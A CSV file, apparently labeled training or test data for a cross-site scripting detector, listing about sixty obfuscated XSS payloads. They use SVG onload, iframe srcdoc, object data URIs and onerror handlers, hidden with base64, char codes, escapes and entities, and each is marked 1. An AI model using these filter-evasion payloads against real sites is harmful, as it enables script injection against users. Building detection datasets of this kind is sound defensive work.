"<iframe srcdoc=""<object data='data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></object>""></iframe>",1
"<iframe srcdoc=""<svg onload=self['alert'](String.fromCharCode(88,83,83))>"">",1
"<iframe srcdoc=""<iframe srcdoc='<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></iframe>""></iframe>",1
<svg onload='eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))'></svg>,1
<svg onload=eval(atob('YWxlcnQoMSk='))>,1
"<svg onload='(new Function(""return eval""))()(decodeURIComponent(""%61%6c%65%72%74%28%31%29""))'></svg>",1
"<iframe srcdoc=""<script>window['\x61'+'\x6c'+'\x65'+'\x72'+'\x74'](44)</script>""></iframe>",1
"<svg/onload=setTimeout(Function(""al\x65rt(1)""),0)>",1
"<svg onload='fetch(`data:text/javascript,al%65rt(1)`).then(res=>res.text()).then(eval)'>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61%6C%65%72%74%281%29'))>""></iframe>",1
"<iframe srcdoc='<img src=x onerror=setTimeout(`\\u0061lert(1)`,0)>'></iframe>",1
<svg onload=eval(&#x61;&#x6c;&#x65;&#x72;&#x74;(1))></svg>,1
"<iframe srcdoc=""<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(String.fromCharCode(68))>"">",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))>""></iframe>",1
"<svg onload=""set&#84;imeout(&#39;&#97;lert&#40;/XSS/\&#41;&#39;)"">",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116).concat('(1)'))>",1
"<svg onload=setTimeout('a'+'lert(1)',0)>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,46,97,108,101,114,116,40,49,41))>""></iframe>",1
"<svg onload=""new Function(atob('YWxlcnQoMSk='))()"">",1
"<iframe srcdoc=""<img src=x onerror=window['al'+'\u0065rt'](1)>""></iframe>",1
"<iframe srcdoc=""<script>Function('\x61'+'\x6c'+'\x65'+'\x72'+'\x74(52)')()</script>""></iframe>",1
"<iframe srcdoc=""<img src='x' onerror=eval('window.ale'+'rt(22)')>""></iframe>",1
"<svg onload=""setTimeout(()=>window['al'+'ert'](1),0)"">",1
<svg onload=eval(decodeURIComponent(`%61%6C%65%72%74(1)`))>,1
"<object data='data:text/html,<img src=x onerror=window[""al""+""ert""](1)>'></object>",1
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""eval(unescape('%61%6c%65%72%74%28%31%29'))""></svg>",1
<iframe srcdoc='<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>'></iframe>,1
"<iframe srcdoc=""<script>window['\u0061\u006c\u0065\u0072\u0074'](32)</script>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(`al`+`ert(1)`,0)>""></iframe>",1
"<svg onload='setInterval(() => alert(1), 1000)'>",1
"<iframe srcdoc=""<svg onload=eval('al'+'ert(1)')>"">",1
"<object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>",1
"<object data='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='></object>",1
"<iframe src=""javascript:window['\x61\x6c\x65\x72\x74'](1)"">",1
<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>,1
"<iframe src=""data:text/html,<body onload=eval(atob('YWxlcnQoMSk='))></body>""></iframe>",1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(3)'))>,1
"<iframe srcdoc=""<svg onload=window['al'+'ert'].apply(null,[1])>""></iframe>",1
<svg onload=window['\u0061lert'](1)>,1
"<iframe srcdoc=""<img src='x' onerror=eval(atob('YWxlcnQoNik='))>""></iframe>",1
"<object data=""data:text/html,<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>""></object>",1
"<svg onload=setTimeout('al'+'\x65rt(1)',0)>",1
"<iframe srcdoc=""<img src=x onerror=eval(unescape('%61%6c%65%72%74(49)'))>"">",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(`\\u0061l\\u0065rt(1)`,0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=location=`javascript:alert\`2\``>""></iframe>",1
<svg onload=eval(decodeURIComponent('al%65rt(1)'))>,1
"<object data=""data:text/html;base64,PHN2ZyBvbmxvYWQ9J2FsZXJ0KDEpJz48L3N2Zz4=""></object>",1
"<svg onload='eval(unescape(""%61%6c%65%72%74%28%31%32%33%29""))'>",1
"<iframe srcdoc='<img src=x onerror=window[atob(""YWxlcnQ="")](1)>'></iframe>",1
"<object data=""data:text/html,<img src=x onerror=eval('ale'+'rt(1)')>""></object>",1
"<details open ontoggle='(window.Function(atob(""YWxlcnQoMSk="")))()'></details>",1
"<iframe srcdoc=""<script>eval('al\x65rt(0x7b)')</script>""></iframe>",1
<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`) />,1
"<iframe srcdoc=""<svg onload=setTimeout('al'+'ert(2)',0)>""></iframe>",1
<svg onload=location=`javascr`+`ipt:al`+`ert(1)`>,1
<svg onload=eval(atob(&#34;d2luZG93LmFsZXJ0KDEp&#34;))>,1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))>""></iframe>",1
"<svg onload=window.setTimeout('al'+'ert(1)',0)>",1
